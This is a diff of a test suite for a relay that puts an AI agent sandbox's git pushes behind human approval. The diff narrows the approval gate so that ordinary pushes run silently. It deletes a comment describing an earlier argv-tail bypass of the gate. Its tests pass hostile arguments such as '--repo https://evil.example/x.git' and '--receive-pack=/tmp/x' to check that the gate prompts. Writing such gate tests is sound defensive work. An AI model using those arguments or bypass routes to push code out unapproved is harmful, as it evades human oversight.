@@ -374,11 +374,12 @@ describe('relay prompt flow', () => {
   it('denial via /admin/prompts/answer short-circuits git.push with exit 10', async () => {
     await register(handle, 'b1', 't1', 'box-one');
 
-    // Kick off the /rpc — it'll hang waiting for an answer. We drive the
-    // answer flow concurrently and await both.
+    // A deletion is one of the few pushes that still asks (an ordinary push
+    // runs silently). Kick off the /rpc — it'll hang waiting for an answer. We
+    // drive the answer flow concurrently and await both.
     const rpcPromise = fetchJson(handle, 'POST', '/rpc', {
       token: 't1',
-      body: { method: 'git.push', params: { path: '/workspace' } },
+      body: { method: 'git.push', params: { path: '/workspace', args: ['--delete', 'gone'] } },
     });
 
     // Wait for the pending prompt to land in the relay's map. The /rpc
@@ -404,11 +405,10 @@ describe('relay prompt flow', () => {
     expect(body.stderr).toMatch(/denied by user/);
   });
 
-  it('git.push to a non-scratch SANCTIONED branch still prompts under the strict flag', async () => {
-    // Regression: the docker gate must key "scratch bypass" on the branch it
-    // actually pushes (sanctionedBranch), not the immutable create-time branch.
-    // With autoApproveSafeHostActions:false and sanctionedBranch=main, the push
-    // targets main and MUST prompt (not silently bypass).
+  it('git.push to a non-scratch branch runs silently, strict flag or not', async () => {
+    // The inversion: publishing commits is ordinary, revertable agent work, so
+    // the branch no longer decides and `autoApproveSafeHostActions` no longer
+    // reaches this gate. Only what a push DOES can make it ask.
     const reg = await fetchJson(handle, 'POST', '/admin/register-box', {
       body: {
         boxId: 'b1',
@@ -426,31 +426,21 @@ describe('relay prompt flow', () => {
       },
     });
     expect(reg.status).toBe(204);
-    const rpcPromise = fetchJson(handle, 'POST', '/rpc', {
+    const rpc = await fetchJson(handle, 'POST', '/rpc', {
       token: 't1',
       body: { method: 'git.push', params: { path: '/workspace' } },
     });
-    let pendingId: string | null = null;
-    for (let i = 0; i < 500 && pendingId === null; i++) {
-      const list = handle.prompts.forBox('b1');
-      if (list.length > 0) pendingId = list[0]!.id;
-      else await new Promise((r) => setTimeout(r, 10));
-    }
-    expect(pendingId).not.toBeNull();
-    await fetchJson(handle, 'POST', '/admin/prompts/answer', {
-      body: { id: pendingId, answer: 'n' },
-    });
-    const rpc = await rpcPromise;
+    // /tmp is not a git repo, so git itself fails — the point is that the push
+    // reached git instead of parking on an approval.
     expect(rpc.status).toBe(500);
-    expect((rpc.body as { exitCode: number }).exitCode).toBe(10);
+    expect(handle.prompts.forBox('b1')).toHaveLength(0);
   });
 
   /**
-   * The argv-tail escape: the relay picks the branch it pushes, but the box's
-   * tail is appended to it and git accepts several refspecs. A scratch-branch
-   * box could once append its own target and publish it with no prompt.
+   * The push gate, blocklist-shaped like the `gh` one: adding commits to any
+   * branch is ordinary work and runs silently; only the irreversible asks.
    */
-  describe('git.push argv-tail targets', () => {
+  describe('git.push destructive argv', () => {
     async function registerScratch(): Promise<void> {
       const reg = await fetchJson(handle, 'POST', '/admin/register-box', {
         body: {
@@ -502,31 +492,47 @@ describe('relay prompt flow', () => {
       expect((rpc.body as { exitCode: number }).exitCode).toBe(10);
     }
 
-    it('a scratch-branch push with a routine tail still bypasses the gate', async () => {
+    it('an ordinary push runs silently, to the box branch or any other', async () => {
       await registerScratch();
       await pushExpectingNoPrompt();
+      await pushExpectingNoPrompt(['some-new-branch']);
+      await pushExpectingNoPrompt(['HEAD:refs/heads/other']);
+      await pushExpectingNoPrompt(['--tags']);
+    });
+
+    it("force-pushing the box's own scratch branch runs silently", async () => {
+      await registerScratch();
       await pushExpectingNoPrompt(['--force']);
+      await pushExpectingNoPrompt(['+HEAD:refs/heads/agentbox/other']);
+      await pushExpectingNoPrompt(['--force-with-lease']);
     });
 
-    it("a tail naming the box's own branch still bypasses the gate", async () => {
+    it('a deletion must ask', async () => {
       await registerScratch();
-      await pushExpectingNoPrompt(['agentbox/box-one']);
-      await pushExpectingNoPrompt(['HEAD:refs/heads/agentbox/other']);
+      await pushExpectingPrompt(['--delete', 'some-branch']);
     });
 
-    it('a tail that adds an unsanctioned refspec must ask, even on a scratch branch', async () => {
+    it('a force-push to a branch the box did not create must ask', async () => {
       await registerScratch();
-      await pushExpectingPrompt(['other-branch']);
+      await pushExpectingPrompt(['--force', 'main']);
+      await pushExpectingPrompt(['+HEAD:refs/heads/main']);
     });
 
-    it('the same holds for a fully-qualified injected refspec', async () => {
+    it('the wholesale ref syncs must ask', async () => {
       await registerScratch();
-      await pushExpectingPrompt(['HEAD:refs/heads/other']);
+      await pushExpectingPrompt(['--mirror']);
+      await pushExpectingPrompt(['--prune']);
     });
 
-    it('a tail of flags that publish unenumerable refs must ask', async () => {
+    it('an argv that escapes the intended remote must ask', async () => {
       await registerScratch();
-      await pushExpectingPrompt(['--tags']);
+      await pushExpectingPrompt(['--repo', 'https://evil.example/x.git']);
+      await pushExpectingPrompt(['--receive-pack=/tmp/x']);
+    });
+
+    it('an unrecognised flag must ask (fail closed)', async () => {
+      await registerScratch();
+      await pushExpectingPrompt(['--brand-new-git-flag']);
     });
   });
 
@@ -535,7 +541,7 @@ describe('relay prompt flow', () => {
 
     const rpcPromise = fetchJson(handle, 'POST', '/rpc', {
       token: 't1',
-      body: { method: 'git.push', params: { path: '/workspace' } },
+      body: { method: 'git.push', params: { path: '/workspace', args: ['--delete', 'gone'] } },
     });
 
     // Wait for the pending prompt to register.
